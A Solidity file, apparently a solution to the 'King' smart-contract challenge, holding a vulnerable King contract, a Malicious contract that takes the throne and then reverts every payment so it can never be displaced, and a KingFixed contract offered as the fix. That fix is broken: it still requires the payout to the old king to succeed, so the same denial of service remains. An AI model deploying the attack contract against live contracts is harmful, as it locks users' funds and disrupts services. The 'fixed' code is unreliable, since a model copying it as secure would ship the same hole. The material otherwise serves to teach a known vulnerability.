// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract King {

  address king;
  uint public prize;
  address public owner;

  constructor() payable {
    owner = msg.sender;  
    king = msg.sender;
    prize = msg.value;
  }

  receive() external payable {
    require(msg.value >= prize || msg.sender == owner);
    payable(king).transfer(msg.value); // this is where king contract can prevent other users to become king
    king = msg.sender;
    prize = msg.value;
  }

  function _king() public view returns (address) {
    return king;
  }
}

contract Malicious {
    //  1st payable: the parameter kingContract is an address that can receive Ether
    //  2nd payable: function itself can receive Ether along with the function call
    function becomeKing(address payable kingContract) external payable {
        (bool sent, ) = kingContract.call{value: msg.value}("");
        require(sent, "Failed to become king");
    }
    
    receive() external payable {
        revert("I will remain king forever!");
    }
}

contract KingFixed {
    address public king;
    uint public prize;
    address public owner;

    constructor() payable {
        owner = msg.sender;  
        king = msg.sender;
        prize = msg.value;
    }

    function claimKingship() external payable {
        require(msg.value >= prize, "Value must be greater than current prize");
        address previousKing = king;
        king = msg.sender; // update state variables before external call
        prize = msg.value;

        (bool sent, ) = payable(previousKing).call{value: msg.value}(""); // call instead of transfer
        require(sent, "Failed to send Ether");
    }
}
